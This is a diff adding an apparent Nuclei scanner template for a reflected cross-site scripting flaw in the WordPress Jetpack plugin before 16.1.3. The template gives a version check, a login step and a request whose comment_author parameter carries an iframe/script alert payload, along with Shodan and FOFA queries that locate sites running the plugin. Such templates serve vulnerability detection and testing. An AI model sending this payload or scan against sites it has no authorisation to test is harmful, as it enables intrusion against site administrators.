@@ -1,0 +1,79 @@
+id: jetpack-reader-xss
+
+info:
+  name: WordPress Jetpack < 16.1.3 - Reflected Cross-Site Scripting
+  author: kosoyyagent,0xr2r
+  severity: medium
+  description: |
+    WordPress Jetpack plugin before 16.1.3 does not sanitize the comment_author parameter before outputting it in the Reader editor, allowing a reflected cross-site scripting attack against an administrator who opens a crafted link.
+  reference:
+    - https://jetpack.com/resources/jetpack-16-1-3-critical-security-update/
+    - https://wordpress.org/plugins/jetpack/
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 6.1
+    cwe-id: CWE-79
+  metadata:
+    verified: true
+    max-request: 3
+    vendor: automattic
+    product: jetpack
+    fofa-query: body="/wp-content/plugins/jetpack/"
+    shodan-query: http.html:"/wp-content/plugins/jetpack/"
+  tags: xss,jetpack,wordpress,wp-plugin,authenticated,vuln
+
+flow: http(1) && http(2) && http(3)
+
+http:
+  - raw:
+      - |
+        GET /wp-content/plugins/jetpack/readme.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body, 'Jetpack')
+          - compare_versions(version, '<= 16.1.2')
+        condition: and
+        internal: true
+
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        name: version
+        internal: true
+        regex:
+          - 'Stable tag: ([0-9.]+)'
+
+  - raw:
+      - |
+        POST /wp-login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        log={{username}}&pwd={{password}}&wp-submit=Log+In
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 302
+          - contains(header, "wordpress_logged_in")
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        GET /wp-admin/post-new.php?url=https%3A%2F%2Fwp.com%2Fsource&comment_content=safe&comment_author=%3Ciframe%20srcdoc%3D%22%3Cscript%3Etop.alert%28top.document.domain%29%3C%2Fscript%3E%22%3Ex%3C%2Fiframe%3E HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(content_type, "text/html")
+          - contains(body, 'top.alert%28top.document.domain%29')
+        condition: and
+# digest: 490a00463044022071202310ebaf360aa549b3d2537b2a3eed880c3e981dc59b13bb72c6d9d1212402205154555b795d64fe39a657dd62de0c4ab3a2bff62771c4afac3c29c65670a3f0:922c64590222798bb761d5b6d8e72950
